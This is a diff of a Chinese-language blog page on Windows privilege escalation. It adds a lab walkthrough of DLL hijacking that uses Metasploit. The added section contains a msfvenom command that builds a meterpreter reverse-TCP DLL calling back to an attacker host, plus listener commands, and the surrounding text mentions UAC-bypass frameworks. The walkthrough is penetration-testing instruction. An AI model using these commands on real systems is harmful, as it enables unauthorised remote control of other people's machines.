@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 字
+      2k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24
+      27
        分钟
     </span>
   
@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：October 15, 2021 am
+                  本文最后更新于：October 15, 2021 pm
                 
               </p>
             
@@ -315,6 +315,41 @@
 
 <h4 id="Powershell的渗透测试框架-Bypass-UAC"><a href="#Powershell的渗透测试框架-Bypass-UAC" class="headerlink" title="Powershell的渗透测试框架 Bypass UAC"></a>Powershell的渗透测试框架 Bypass UAC</h4><p>可以使用Nishang、PowerSploit以及Empire等Powershell渗透框架也可以，在此不做介绍</p>
 <h4 id="UACME项目-Bypass-UAC"><a href="#UACME项目-Bypass-UAC" class="headerlink" title="UACME项目 Bypass UAC"></a>UACME项目 Bypass UAC</h4><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>在.exe文件执行时，会加载DLL文件，我们可以利用恶意的DLL文件来替换.exe文件运行时加载的DLL文件，达到提权的目的</p>
+<h4 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
+<p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
+<h4 id="DLL劫持-1"><a href="#DLL劫持-1" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>本次演示我们用到Windows Server 2008R2上的一款.exe可执行文件<strong>，该软件启动时会加载libeay32.dll文件</strong></p>
+<img src="/img/Windows提权方式总结/1.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>打开火绒剑，可以看到该程序在运行时会加载libeay32.dll文件</p>
+<img src="/img/Windows提权方式总结/2.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>msf生成恶意dll文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.199.123  lport=4444 -f dll -o libeay32.dll<br></code></pre></td></tr></table></figure>
+
+
+
+<p>msf执行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">set</span> lhost 192.168.199.123<br>$ <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br>$ run<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用生成的恶意dll替换libeay32.dll文件</p>
+<img src="/img/Windows提权方式总结/3.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>运行.exe可执行文件，msf上线</p>
+<img src="/img/Windows提权方式总结/4.gif" srcset="/img/loading.gif" lazyload>
+
+
+
+
+
 <p>待更新…</p>
 
             </div>
